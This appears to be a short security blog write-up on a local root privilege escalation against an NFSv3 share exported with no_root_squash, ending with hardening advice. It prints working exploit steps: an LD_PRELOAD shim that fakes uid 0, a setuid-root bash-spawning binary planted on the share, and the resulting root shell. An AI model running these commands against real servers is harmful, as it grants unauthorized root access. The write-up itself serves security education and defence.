A tale of a NFS privesc
=======================

There are countless online examples of privilege escalation abusing bad NFS configuration.

However they all rely on the same prerequisite: that you are able to mount the share from somewhere else.


The NFS options
---------------

Server export options:

* secure/insecure: in secure mode, forces the client to communicate using a port below 1024, hence proving they are root
* root_squash/no_root_squash: root_squash is the **secure default**. It replaces the root user with nfsnobody. This prevents setuid attacks, such as those presented below. The opposite option no_root_squash has the share behave like a traditional filesystem
* filtering: only let identified IP addresses mount the shares

Client mount options:

* noexec: forbids execution from the mountpoint
* nosuid: forbids setuid on the mountpoint


The classic remote attack
-------------------------

To briefly sum up what the attacks presented on the previous links do:

* mount the share from another machine where you're root
* place a setuid binary there
* on the victim machine, run the binary and get root

This attack requires two things:

* that the server is running no_root_squash
* that there is no network/application filtering that prevents the attacker from mounting the share on his own computer.


The  local attack
-----------------

Now, assume the share server still runs no_root_squash but there is something preventing you from mounting the share on your machine. So we're stuck to exploiting the machine locally from an unprivileged user. It just so happens that there is another, lesser known local exploit.

This exploit relies on a problem in the NFSv3 specification that mandates that it's the client that advertises its uid/gid when accessing the share. Thus it's possible to fake it!

Here's a [library that lets you do just that](https://github.com/sahlberg/libnfs).

Compiling the example
~~~~~~~~~~~~~~~~~~~~~
Depending on your kernel, you might need to adapt the example. In my case I had to comment out the fallocate syscall. Due to the absence of cmake on the system, I also needed to link against the precompiled library which can be [found here](https://sites.google.com/site/libnfstarballs/li).

```
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L../libnfs-1.11.0/lib/.libs/
```

Exploiting using the library
~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Let's use the simplest of exploits:
```
cat ../pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc ../pwn.c -o ../a.out
```

Place our exploit on the share and make it suid root:
```
LD_NFS_UID=0 LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_PRELOAD=./ld_nfs.so chown root:root nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

All that's left is to launch it:
```
[w3user@machine libnfs]$ /mnt/share/a.out
[root@machine libnfs]#
```

There we are, local root privilege escalation!

Thanks to @lnv42 for showing me this cool trick.


Takeaways
---------

Don't use NFSv3.

If you **HAVE** to use NFSv3:

* Don't use no_root_squash serverside
* Use noexec and nosuid clientside
